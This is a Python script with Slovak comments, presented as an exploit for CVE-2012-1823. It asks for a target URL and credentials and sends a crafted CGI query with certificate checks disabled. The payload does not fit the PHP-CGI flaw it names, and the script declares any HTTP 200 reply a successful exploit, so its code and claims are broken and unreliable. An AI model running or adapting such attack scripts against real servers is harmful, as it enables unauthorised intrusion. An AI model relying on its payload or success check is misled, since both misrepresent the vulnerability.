import requests
import urllib3

urllib3.disable_warnings()

# Funkcia na vykonanie exploitácie CVE-2012-1823
def exploit_cve_2012_1823(target_url, username, password):
    # Definícia hlavičiek pre požiadavku
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    # Ak URL neobsahuje http alebo https, pridáme to
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url

    # Definovanie payloadu pre CVE-2012-1823
    payload = "/cgi-bin/test-cgi?%0Aecho+test%0A"  # Tento payload zneužíva neoverené CGI parametre

    # Vytvárame kompletnú URL s payloadom
    exploit_url = target_url + payload

    # Posielame GET požiadavku na server s prihlasovacími údajmi
    response = requests.get(exploit_url, headers=headers, auth=(username, password), verify=False)

    # Skontrolujeme odpoveď
    if response.status_code == 200:
        print(f"Vulnerable to CVE-2012-1823! Exploit ran successfully.")
        print(f"Response body (partial): {response.text[:200]}")  # Ukážeme časť odpovede
    else:
        print("Server is not vulnerable or exploit did not work.")

# Hlavný kód
if __name__ == "__main__":
    # Získame URL a prihlasovacie údaje od používateľa
    target_url = input("Enter the target URL (e.g., https://example.com): ")
    username = input("Enter the username: ")
    password = input("Enter the password: ")

    # Voláme funkciu exploitáciu
    exploit_cve_2012_1823(target_url, username, password)
